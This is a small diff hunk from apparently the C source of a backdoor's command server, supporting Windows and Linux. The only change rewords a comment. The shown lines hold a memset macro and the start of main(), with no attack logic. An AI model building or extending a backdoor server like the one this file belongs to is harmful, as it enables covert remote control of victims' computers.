@@ -23,7 +23,7 @@
 #define bzero(p, size) (void) memset((p), 0, (size)) // Zeros all bytes in a specified memory region
 
 
-// SERVER USED FOR THE BACKDOOR
+// SERVER USED TO COMMUNICATE WITH THE BACKDOOR
 // This is supported for windows and linux.
 
 int main(){
